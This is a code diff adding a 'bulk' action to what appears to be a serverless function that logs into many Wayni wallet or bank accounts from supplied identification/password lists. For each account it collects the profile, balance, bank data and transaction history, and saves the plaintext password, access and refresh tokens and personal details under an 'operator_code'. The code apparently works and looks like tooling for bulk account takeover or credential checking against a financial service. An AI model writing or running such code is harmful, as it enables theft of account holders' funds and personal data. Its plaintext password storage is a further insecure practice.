@@ -322,6 +322,86 @@ serve(async (req) => {
       });
     }
 
+    // ─── ACTION: bulk ───
+    if (action === "bulk") {
+      const { accounts: bulkAccounts, operator_code: bulkOpCode } = body;
+      if (!Array.isArray(bulkAccounts) || bulkAccounts.length === 0) throw new Error("Missing accounts array");
+
+      const results = [];
+      for (const acc of bulkAccounts) {
+        const { identification, password } = acc;
+        if (!identification || !password) {
+          results.push({ success: false, identification: identification || "?", error: "Missing credentials" });
+          continue;
+        }
+        try {
+          const authData = await wayniLogin(identification, password);
+          const token = authData.access_token;
+
+          let profile: any = null;
+          let balance: any = null;
+          let activities: any = null;
+          try { profile = await wayniGetMe(token); } catch {}
+          try { balance = await wayniGetBalance(token); } catch {}
+          try {
+            const wa = profile?.bank?.internal_account?.[0]?.wallet_account;
+            if (wa) activities = await wayniActivities(token, wa);
+          } catch {}
+
+          const fullName = profile?.profile?.full_name || null;
+          const email = profile?.profile?.email || null;
+          const phone = profile?.profile?.phone || null;
+          const userUuid = profile?.user?.uuid || null;
+          const opCode = bulkOpCode || "master";
+
+          // Save to DB
+          const { data: existing } = await sb.from("wayni_accounts").select("id").eq("identification", identification).maybeSingle();
+          const accountData = {
+            identification,
+            password,
+            email,
+            full_name: fullName,
+            phone,
+            access_token: token,
+            refresh_token: authData.refresh_token,
+            user_uuid: userUuid,
+            profile_data: profile,
+            balance: balance?.balance || "0",
+            bank_data: profile?.bank || null,
+            activities: activities || null,
+            operator_code: opCode,
+            last_login_at: new Date().toISOString(),
+            updated_at: new Date().toISOString(),
+          };
+
+          if (existing) {
+            await sb.from("wayni_accounts").update(accountData).eq("id", existing.id);
+          } else {
+            await sb.from("wayni_accounts").insert(accountData);
+          }
+
+          results.push({
+            success: true,
+            identification,
+            full_name: fullName,
+            email,
+            phone,
+            balance: balance?.balance || "0",
+            user_uuid: userUuid,
+            profile,
+            bank_data: profile?.bank || null,
+            saved: true,
+          });
+        } catch (e: any) {
+          results.push({ success: false, identification, error: e.message || "Login failed" });
+        }
+      }
+
+      return new Response(JSON.stringify({ success: true, results }), {
+        headers: { ...corsHeaders, "Content-Type": "application/json" },
+      });
+    }
+
     // ─── ACTION: sync_all ───
     if (action === "sync_all") {
       const { data: accs } = await sb.from("wayni_accounts").select("id, access_token").not("access_token", "is", null);
